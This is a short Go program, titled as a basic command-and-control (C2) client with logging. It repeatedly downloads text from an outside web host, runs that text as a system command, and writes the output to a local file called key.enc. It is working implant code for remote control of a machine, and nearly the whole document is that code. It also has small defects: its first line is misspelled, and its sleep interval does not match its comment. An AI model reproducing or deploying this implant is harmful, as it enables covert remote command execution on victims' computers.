Basic golang c2 with logging
-------------------------------------------

ackage main

import (
        "fmt"
        "math/rand"
        "os/exec"
        "os"
        "io/ioutil"
        "net/http"
        "time"
)

func main() {
        // Seed the random number generator with the current time
        rand.Seed(time.Now().UnixNano())

        for {
                // Generate a random sleep duration between 1 and 5 minutes
                sleepDuration := time.Duration(rand.Intn(1)+1) * time.Minute

                time.Sleep(sleepDuration)

                // Run the command
                runCommand()
        }
}

func runCommand() {
// Specify the URL of the text file to download
    fileURL := "http://burp.digitaloffensive.com"

// Download the file
    response, err := http.Get(fileURL)
    if err != nil {
        fmt.Printf("Error downloading file: %v\n", err)
        return
    }
    defer response.Body.Close()

// Read the file contents into a byte slice
    fileBytes, err := ioutil.ReadAll(response.Body)
    if err != nil {
        fmt.Printf("Error reading file: %v\n", err)
        return
    }
  
// Convert the byte slice to a string
    fileContent := string(fileBytes)

// Print the file contents
//    fmt.Println(fileContent)


// Replace "ls" with the command you want to run
        //cmd := exec.Command("ls", "-l")
        cmd := exec.Command(fileContent)
        // Run the command and get the output
        output, err := cmd.Output()
        if err != nil {
                fmt.Printf("Error running command: %v\n", err)
                return
        }
//      fmt.Printf("Command output:\n%s\n", output)
        // Get the current date and time
        now := time.Now()
        // Open a file to write the output
        file, err := os.OpenFile("key.enc", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                fmt.Printf("Error opening file: %v\n", err)
                return
        }
        defer file.Close()

        // Write the date and time to the file
        _, err = fmt.Fprintf(file, "\n\n--- Command ran at %s ---\n", now.Format("2006-01-02 15:04:05"))
        if err != nil {
                fmt.Printf("Error writing to file: %v\n", err)
                return
        }

        // Write the output to the file
        _, err = file.Write(output)
        if err != nil {
                fmt.Printf("Error writing to file: %v\n", err)
                return
        }
}
